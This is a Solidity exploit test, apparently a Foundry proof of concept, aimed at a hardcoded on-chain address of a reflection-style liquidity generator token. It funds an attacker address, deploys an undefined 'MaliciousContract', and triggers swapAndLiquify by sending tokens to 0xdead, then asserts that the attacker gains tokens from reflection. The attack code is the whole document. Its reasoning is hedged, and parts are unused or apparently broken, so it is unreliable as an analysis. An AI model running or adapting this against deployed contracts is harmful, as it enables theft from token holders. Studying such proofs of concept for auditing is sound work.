contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    ILiquidityGeneratorToken token;
    MaliciousContract malicious;
    uint256 initialBalance;
    address constant TARGET = 0xE2C9C976337357369845c761DD851E2B6942D69f;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ILiquidityGeneratorToken(TARGET);

        // Inject tokens to attacker
        deal(TARGET, address(this), 100000 * 1e9);

        // Deploy malicious contract
        malicious = new MaliciousContract(TARGET);

        // Transfer some tokens to malicious contract to set up
        vm.prank(address(this));
        token.transfer(address(malicious), 50000 * 1e9);

        // Record initial balance
        initialBalance = token.balanceOf(address(this));
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the minimum tokens needed to trigger swap
        uint256 minTokens = token.numTokensSellToAddToLiquidity();

        // Record balances before
        uint256 attackerBefore = token.balanceOf(address(this));
        uint256 contractBefore = token.balanceOf(TARGET);

        // Transfer tokens to trigger swapAndLiquify
        // This will cause the contract to swap tokens for ETH
        // During the swap, fees are reflected to all holders
        vm.prank(address(this));
        token.transfer(address(0xdead), minTokens);

        // Record balance after
        uint256 attackerAfter = token.balanceOf(address(this));

        // Due to reflection mechanism during swap, attacker may receive fee redistribution
        // The reflection rate changes during the swap operation
        assertGt(attackerAfter, attackerBefore, "Attacker should gain tokens from reflection during swap");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
